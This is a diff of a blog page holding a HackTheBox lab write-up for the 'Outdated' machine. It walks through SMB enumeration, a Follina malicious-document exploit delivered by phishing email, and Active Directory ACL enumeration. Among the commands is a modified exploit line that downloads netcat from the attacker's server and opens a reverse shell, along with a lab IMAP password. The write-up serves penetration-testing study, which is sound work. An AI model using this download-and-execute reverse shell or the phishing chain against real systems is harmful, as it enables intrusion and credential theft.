@@ -40,7 +40,7 @@
   <meta itemprop="description" content="A write-up for the Outdated box.">
   <meta itemprop="datePublished" content="2025-03-08T00:00:00+00:00">
   <meta itemprop="dateModified" content="2025-03-08T00:00:00+00:00">
-  <meta itemprop="wordCount" content="450">
+  <meta itemprop="wordCount" content="3936">
   <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
   <meta itemprop="keywords" content="HTB,Pentesting">
 <meta name="referrer" content="no-referrer-when-downgrade" />
@@ -230,7 +230,9 @@
 </p>
 
 <content>
-  <p>Starting off with our normal <code>nmap</code> scan using the flags for enabling scripts and version detection on all ports</p>
+  <p>This box starts off with an initial access vector that requires a decent amount of research and customization. We find an open SMB share with a PDF about recent vulnerabilities that have been identified within the organization and an email address to send any knowledge of new vulnerabilities found. One of the CVEs there is Follina, which is a remote code execution vulnerability that results from a malicious word document. However, sending a URL with a word document, doesn&rsquo;t go through for whatever reason. Using John Hammond&rsquo;s Follina exploit, you can get this to work without having to do a work-around on your end. We land on a nested VM, as the <code>btables</code> user who is a member of the <code>ITStaff</code> group and can create Shadow Credentials for the <code>sflowers</code> user. After moving laterally to the <code>sflowers</code> user, we are able to exploit WSUS to get a shell as SYSTEM.</p>
+<hr>
+<p>Starting off with our normal <code>nmap</code> scan using the flags for enabling scripts and version detection on all ports</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.175 -oA Scans/outdated_all
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 12:08 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.175
@@ -302,7 +304,560 @@
 </span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 429.88 seconds
 </span></span></code></pre></div><p>This looks like a domain controller. The things that stand out to me are SMTP and HTTP on 8530. Navigating to the web page and it&rsquo;s just blank
 <img src="/images/Outdated/website.png" alt="Website"></p>
-
+<p>When we <code>telnet</code> into SMTP, we see the mail server is <code>mail.outdated.htb</code>. We try a few commands to try to enumerate users, but no success. Checking out SMB we see some extra shares we don&rsquo;t usually see</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.11.175
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share
+</span></span><span style="display:flex;"><span>        Shares          Disk
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
+</span></span><span style="display:flex;"><span>        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+</span></span><span style="display:flex;"><span>        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
+</span></span><span style="display:flex;"><span>        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 for workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.11.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Checking out the <code>Shares</code> directory, we see a PDF</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N //10.10.11.175/Shares
+</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: \&gt; dir
+</span></span><span style="display:flex;"><span>  .                                   D        0  Mon Jun 20 11:01:33 2022
+</span></span><span style="display:flex;"><span>  ..                                  D        0  Mon Jun 20 11:01:33 2022
+</span></span><span style="display:flex;"><span>  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 11:00:32 2022
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>                9116415 blocks of size 4096. 1513141 blocks available
+</span></span></code></pre></div><p>Opening up the PDF we see a valid email address <code>itsupport@outdated.htb</code>, and we also see some CVEs that our target host may be vulnerable to!
+<img src="/images/Outdated/NOC.png" alt="NOC"></p>
+<p>Checking the rest of the shares results in an <code>NT_STATUS_ACCESS_DENIED</code>. Looking through the list of CVEs, we notice CVE-2022-30190 (Follina). This is a vulnerability in the Microsoft Windows Diagnostic Tool that results in remote code execution. Essentially, we need to send a malicious Word document, and when they open the document, we can get code execution.</p>
+<p>In the PDF, we notice it says to email them a link to any internal web applications and that they have onboarded a new SOC analyst to handle a lot of this. This is a perfect scenario to social engineer this person into opening our malicious document. MetaSploit has a module for this, and we can set it up</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[msf](Jobs:0 Agents:0) exploit(windows/fileformat/word_msdtjs_rce) &gt;&gt; show options
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Module options (exploit/windows/fileformat/word_msdtjs_rce):
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   Name            Current Setting                               Required  Description
+</span></span><span style="display:flex;"><span>   ----            ---------------                               --------  -----------
+</span></span><span style="display:flex;"><span>   CUSTOMTEMPLATE  /usr/share/metasploit-framework/data/exploit  yes       A DOCX file that will be used as a template to build the exploit.
+</span></span><span style="display:flex;"><span>                   s/word_msdtjs.docx
+</span></span><span style="display:flex;"><span>   FILENAME        msf.docx                                      no        The file name.
+</span></span><span style="display:flex;"><span>   OBFUSCATE       true                                          yes       Obfuscate JavaScript content.
+</span></span><span style="display:flex;"><span>   OUTPUT_FORMAT   docx                                          yes       File format to use [docx, rtf]. (Accepted: docx, rtf)
+</span></span><span style="display:flex;"><span>   SRVHOST         10.10.14.51                                   yes       The local host or network interface to listen on. This must be an address on the
+</span></span><span style="display:flex;"><span>                                                                           local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span style="display:flex;"><span>   SRVPORT         8080                                          yes       The local port to listen on.
+</span></span><span style="display:flex;"><span>   SSL             false                                         no        Negotiate SSL for incoming connections
+</span></span><span style="display:flex;"><span>   SSLCert                                                       no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span style="display:flex;"><span>   URIPATH                                                       no        The URI to use for this exploit (default is random)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Payload options (windows/x64/meterpreter/reverse_tcp):
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span style="display:flex;"><span>   LHOST     10.10.14.51      yes       The listen address (an interface may be specified)
+</span></span><span style="display:flex;"><span>   LPORT     4444             yes       The listen port
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Exploit target:
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   0   Microsoft Office Word
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>View the full module info with the info, or info -d command.
+</span></span></code></pre></div><p>Since we have access to SMTP, we can send the email that way. Before we do, we can also look for some more users that might be useful later</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$./kerbrute_linux_amd64 userenum -d outdated.htb --dc 10.10.11.175 jsmith.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    __             __               __
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____
+</span></span><span style="display:flex;"><span>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+</span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Version: v1.0.3 (9dad6e1) - 03/11/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>2025/03/11 13:21:04 &gt;  Using KDC(s):
+</span></span><span style="display:flex;"><span>2025/03/11 13:21:04 &gt;   10.10.11.175:88
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>2025/03/11 13:23:57 &gt;  [+] VALID USERNAME:       sflowers@outdated.htb
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>2025/03/11 13:37:44 &gt;  Done! Tested 48705 usernames (1 valid) in 999.812 seconds
+</span></span></code></pre></div><p>Let&rsquo;s also try RID cycling</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.175 -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               [+] outdated.htb\guest:
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               498: OUTDATED\Enterprise Read-only Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               500: OUTDATED\Administrator (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               501: OUTDATED\Guest (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               502: OUTDATED\krbtgt (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               512: OUTDATED\Domain Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               513: OUTDATED\Domain Users (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               514: OUTDATED\Domain Guests (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               515: OUTDATED\Domain Computers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               516: OUTDATED\Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               517: OUTDATED\Cert Publishers (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               518: OUTDATED\Schema Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               519: OUTDATED\Enterprise Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               520: OUTDATED\Group Policy Creator Owners (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               521: OUTDATED\Read-only Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               522: OUTDATED\Cloneable Domain Controllers (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               525: OUTDATED\Protected Users (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               526: OUTDATED\Key Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               527: OUTDATED\Enterprise Key Admins (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               553: OUTDATED\RAS and IAS Servers (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               571: OUTDATED\Allowed RODC Password Replication Group (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               572: OUTDATED\Denied RODC Password Replication Group (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1000: OUTDATED\WSUS Administrators (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1001: OUTDATED\WSUS Reporters (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1002: OUTDATED\DC$ (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1103: OUTDATED\DnsAdmins (SidTypeAlias)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1104: OUTDATED\DnsUpdateProxy (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1105: OUTDATED\CLIENT$ (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1106: OUTDATED\btables (SidTypeUser)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1107: OUTDATED\ITStaff (SidTypeGroup)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.175    445    DC               1108: OUTDATED\sflowers (SidTypeUser)
+</span></span></code></pre></div><p>We find another user <code>btables</code> and also see the <code>ITStaff</code> group. Ok, let&rsquo;s exploit this thing. First we need to download the exploit - I&rsquo;ll use <a href="https://github.com/JohnHammond/msdt-follina?tab=readme-ov-file">John Hammond&rsquo;s</a>. Then, we need to slightly modify the exploit since it is pulling <code>nc64.exe</code> from GitHub. We will change that to our own address on line 111</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>command = f&#34;&#34;&#34;Invoke-WebRequest http://10.10.14.51:8443/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}&#34;&#34;&#34;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>Then we need to run the exploit specifying the port, interface, and <code>-r 9001</code> to tell the script we want to to get a reverse shell on port 9001</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo python follina.py -p <span style="color:#ae81ff">80</span> -i tun0 -r <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>[+] copied staging doc /tmp/k080ftf2
+</span></span><span style="display:flex;"><span>[+] created maldoc ./follina.doc
+</span></span><span style="display:flex;"><span>[+] serving html payload on :80
+</span></span><span style="display:flex;"><span>[+] starting &#39;nc -lvnp 9001&#39;
+</span></span><span style="display:flex;"><span>listening on [any] 9001 ...
+</span></span></code></pre></div><p>We also need to host our own web server so that the exploit can download <code>nc64.exe</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python -m http.server <span style="color:#ae81ff">8443</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
+</span></span></code></pre></div><p>Finally, we can use <code>swaks</code> to send the email instead of doing it manually through SMTP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$swaks --from tester@htb.com --to itsupport@outdated.htb --header <span style="color:#e6db74">&#39;Subject: Vulnerabilities Found Doc&#39;</span> --body <span style="color:#e6db74">&#39;http://10.10.14.51/&#39;</span> --server mail.outdated.htb
+</span></span><span style="display:flex;"><span>=== Trying mail.outdated.htb:25...
+</span></span><span style="display:flex;"><span>=== Connected to mail.outdated.htb.
+</span></span><span style="display:flex;"><span>&lt;-  220 mail.outdated.htb ESMTP
+</span></span><span style="display:flex;"><span> -&gt; EHLO parrot
+</span></span><span style="display:flex;"><span>&lt;-  250-mail.outdated.htb
+</span></span><span style="display:flex;"><span>&lt;-  250-SIZE 20480000
+</span></span><span style="display:flex;"><span>&lt;-  250-AUTH LOGIN
+</span></span><span style="display:flex;"><span>&lt;-  250 HELP
+</span></span><span style="display:flex;"><span> -&gt; MAIL FROM:&lt;tester@htb.com&gt;
+</span></span><span style="display:flex;"><span>&lt;-  250 OK
+</span></span><span style="display:flex;"><span> -&gt; RCPT TO:&lt;itsupport@outdated.htb&gt;
+</span></span><span style="display:flex;"><span>&lt;-  250 OK
+</span></span><span style="display:flex;"><span> -&gt; DATA
+</span></span><span style="display:flex;"><span>&lt;-  354 OK, send.
+</span></span><span style="display:flex;"><span> -&gt; Date: Tue, 11 Mar 2025 20:24:05 -0400
+</span></span><span style="display:flex;"><span> -&gt; To: itsupport@outdated.htb
+</span></span><span style="display:flex;"><span> -&gt; From: tester@htb.com
+</span></span><span style="display:flex;"><span> -&gt; Subject: Vulnerabilities Found Doc
+</span></span><span style="display:flex;"><span> -&gt; Message-Id: &lt;20250311202405.009799@parrot&gt;
+</span></span><span style="display:flex;"><span> -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+</span></span><span style="display:flex;"><span> -&gt;
+</span></span><span style="display:flex;"><span> -&gt; http://10.10.14.51/
+</span></span><span style="display:flex;"><span> -&gt;
+</span></span><span style="display:flex;"><span> -&gt;
+</span></span><span style="display:flex;"><span> -&gt; .
+</span></span><span style="display:flex;"><span>&lt;-  250 Queued (10.500 seconds)
+</span></span><span style="display:flex;"><span> -&gt; QUIT
+</span></span><span style="display:flex;"><span>&lt;-  221 goodbye
+</span></span><span style="display:flex;"><span>=== Connection closed with remote host.
+</span></span></code></pre></div><p>And finally we get a call back!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo python follina.py -p <span style="color:#ae81ff">80</span> -i tun0 -r <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>[+] copied staging doc /tmp/k080ftf2
+</span></span><span style="display:flex;"><span>[+] created maldoc ./follina.doc
+</span></span><span style="display:flex;"><span>[+] serving html payload on :80
+</span></span><span style="display:flex;"><span>[+] starting &#39;nc -lvnp 9001&#39;
+</span></span><span style="display:flex;"><span>listening on [any] 9001 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.175] 49797
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 10.0.19043.928]
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>C:\Users\btables\AppData\Local\Temp\SDIAG_d3cafaef-c2f1-4e56-8c57-de382e334c5a&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>outdated\btables
+</span></span></code></pre></div><p>After logging in and going to the <code>btables</code> user&rsquo;s directory, we see a script <code>check_mail.ps1</code>, which has what looks like the credentials for the <code>btables</code> user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\Users\btables&gt;type check_mail.ps1
+</span></span><span style="display:flex;"><span>type check_mail.ps1
+</span></span><span style="display:flex;"><span>Import-Module Mailozaurr
+</span></span><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;btables@outdated.htb&#39;</span>
+</span></span><span style="display:flex;"><span>$pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GHKKb7GEHcccdCT8tQV2QwL3&#39;</span>
+</span></span><span style="display:flex;"><span>$regex <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>Regex<span style="color:#f92672">]</span>::new<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;(http(s)?(:\/\/))?((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[\w.]\.htb)(\/[^\s,]+)?)&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$already_seen <span style="color:#f92672">=</span> @<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>$client <span style="color:#f92672">=</span> connect-imap -server <span style="color:#e6db74">&#39;mail.outdated.htb&#39;</span> -password $pass -username $user -port <span style="color:#ae81ff">143</span> -options auto
+</span></span><span style="display:flex;"><span>while ($true) {
+</span></span><span style="display:flex;"><span>    $msgs = Get-IMAPFolder -client $client -verbose
+</span></span><span style="display:flex;"><span>    foreach ($msg in $msgs.Messages) {
+</span></span><span style="display:flex;"><span>        if (-not ($already_seen -contains $msg.MessageId)) {
+</span></span><span style="display:flex;"><span>            $already_seen = $already_seen + $msg.MessageId
+</span></span><span style="display:flex;"><span>            $match = $regex.Matches($msg.TextBody.TrimEnd())
+</span></span><span style="display:flex;"><span>            iwr $match.Value
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    if ($already_seen.count -ge 60) {$already_seen = @()}
+</span></span><span style="display:flex;"><span>    #Disconnect-IMAP -Client $client
+</span></span><span style="display:flex;"><span>    sleep 15
+</span></span><span style="display:flex;"><span>    if (get-process -name msdt) {stop-process -name msdt -force}
+</span></span><span style="display:flex;"><span>    sleep 15
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>c:\Users\btables&gt;
+</span></span></code></pre></div><p>However, upon trying the credentials with <code>evil-winrm</code> they don&rsquo;t seem to work. They may just be for <code>IMAP</code>. Doing some basic enumeration, we see that the <code>btables</code> user is a member of the <code>ITStaff</code> group</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>C:\Users\btables&gt;whoami /groups
+</span></span><span style="display:flex;"><span>whoami /groups
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Group Name                                 Type             SID                                          Attributes
+</span></span><span style="display:flex;"><span>========================================== ================ ============================================ ==================================================
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>CONSOLE LOGON                              Well-known group S-1-2-1                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>OUTDATED\ITStaff                           Group            S-1-5-21-4089647348-67660539-4016542185-1107 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+</span></span></code></pre></div><p>We can enumerate that group further with <code>PowerView</code>. To do this, we use <code>msfvenom</code> to generate a payload and set up <code>metasploit</code> to handle the call back and finally get a shell (not shown since this is very straight forward)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>PS C:\Users\btables&gt; $itstaffsid = Convert-NameToSid &#34;ITStaff&#34;
+</span></span><span style="display:flex;"><span>$itstaffsid <span style="color:#f92672">=</span> Convert-NameToSid <span style="color:#e6db74">&#34;ITStaff&#34;</span>
+</span></span><span style="display:flex;"><span>PS C:\Users\btables&gt; $itstaffsid
+</span></span><span style="display:flex;"><span>$itstaffsid
+</span></span><span style="display:flex;"><span>S-1-5-21-4089647348-67660539-4016542185-1107
+</span></span><span style="display:flex;"><span>PS C:\Users\btables&gt; Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itstaffsid} -Verbose
+</span></span><span style="display:flex;"><span>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itstaffsid} -Verbose
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>AceQualifier           : AccessAllowed
+</span></span><span style="display:flex;"><span>ObjectDN               : CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+</span></span><span style="display:flex;"><span>ActiveDirectoryRights  : ReadProperty, WriteProperty
+</span></span><span style="display:flex;"><span>ObjectAceType          : ms-DS-Key-Credential-Link
+</span></span><span style="display:flex;"><span>ObjectSID              : S-1-5-21-4089647348-67660539-4016542185-1108
+</span></span><span style="display:flex;"><span>InheritanceFlags       : None
+</span></span><span style="display:flex;"><span>BinaryLength           : 56
+</span></span><span style="display:flex;"><span>AceType                : AccessAllowedObject
+</span></span><span style="display:flex;"><span>ObjectAceFlags         : ObjectAceTypePresent
+</span></span><span style="display:flex;"><span>IsCallback             : False
+</span></span><span style="display:flex;"><span>PropagationFlags       : None
+</span></span><span style="display:flex;"><span>SecurityIdentifier     : S-1-5-21-4089647348-67660539-4016542185-1107
+</span></span><span style="display:flex;"><span>AccessMask             : 48
+</span></span><span style="display:flex;"><span>AuditFlags             : None
+</span></span><span style="display:flex;"><span>IsInherited            : False
+</span></span><span style="display:flex;"><span>AceFlags               : None
+</span></span><span style="display:flex;"><span>InheritedObjectAceType : All
+</span></span><span style="display:flex;"><span>OpaqueLength           : 0
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>AceType               : AccessAllowed
+</span></span><span style="display:flex;"><span>ObjectDN              : CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+</span></span><span style="display:flex;"><span>ActiveDirectoryRights : ReadProperty, GenericExecute
+</span></span><span style="display:flex;"><span>OpaqueLength          : 0
